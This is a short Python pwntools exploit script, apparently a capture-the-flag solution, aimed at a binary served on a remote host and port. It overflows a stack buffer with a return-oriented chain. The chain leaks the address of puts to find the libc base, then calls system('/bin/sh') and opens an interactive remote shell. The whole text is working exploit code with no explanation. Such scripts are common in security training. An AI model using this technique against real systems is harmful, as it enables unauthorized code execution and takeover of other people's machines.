from pwn import *
# io = process("./pwn")
io = remote("handsomedog.top", 10001)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
elf = ELF("./pwn", checksec=False)
context.arch = elf.arch
pop_rdi = 0x0000000000400773
payload = "A"*0x20 + "B"*8 + flat(
    [
        pop_rdi, elf.got["puts"], elf.plt["puts"], 0x0400666
    ]
)
io.sendafter(": \n", payload)
libc.address = u64(io.recvline().strip().ljust(8, "\x00"))-libc.sym["puts"]
success("libc: 0x%x"%libc.address)
payload = "A"*0x20 + "B"*8 + flat(
    [
        pop_rdi, next(libc.search("/bin/sh")), libc.sym["system"]
    ]
)
io.send(payload)
io.interactive()
